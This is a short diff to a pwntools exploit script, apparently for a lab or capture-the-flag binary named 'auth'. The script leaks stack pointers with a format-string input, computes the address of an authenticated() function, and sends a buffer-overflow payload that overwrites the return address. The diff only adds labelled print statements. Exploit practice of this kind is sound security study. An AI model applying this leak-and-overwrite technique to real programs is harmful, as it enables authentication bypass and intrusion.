@@ -4,7 +4,7 @@ from pwn import *
 import re
 
 offsetFromStack=0x555555556030-0x55555555519c
-print(offsetFromStack)
+print('Offset from stack string to authenticated(): '+hex(offsetFromStack))
 
 proc=process('./auth')
 
@@ -12,10 +12,12 @@ proc=process('./auth')
 proc.sendline(b"%p %p %p %p %p")
 procAnswer=proc.recvline()
 print(procAnswer)
+print()
 
 # Get the stack address from the program's response
 stackAddr=procAnswer.split(b' ')[7]
-print(stackAddr)
+print('Address of stack string: '+str(stackAddr))
+print()
 
 # Calculate offset of authenticated from the address of string in stack
 stackAddr=int(stackAddr, 0) - offsetFromStack
@@ -23,7 +25,8 @@ stackAddr=int(stackAddr, 0) - offsetFromStack
 # Create payload
 payload=b'A'*0x68
 payload+=p64(stackAddr)
-print(payload)
+print('Payload to send: '+str(payload))
+print()
 
 # Send payload and receive process response
 proc.sendline(payload)
